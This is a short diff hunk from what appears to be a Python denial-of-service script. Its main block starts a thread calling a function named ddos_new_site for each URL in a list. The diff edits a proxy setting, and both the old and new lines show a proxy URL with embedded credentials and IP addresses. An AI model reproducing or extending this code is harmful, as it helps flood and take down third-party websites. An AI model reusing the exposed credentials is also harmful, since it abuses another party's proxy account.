@@ -56,7 +56,7 @@ def ddos_new_site(url, proxy):
 if __name__ == '__main__':
     # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     urls = take_urls()
-    proxy = 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500'
+    proxy = ''#'http://oHXOMY:uIJ0LLa6Ai@46.8.23.244:5500'
 
     for url in urls:
         x = threading.Thread(target=ddos_new_site, args = (url, proxy))
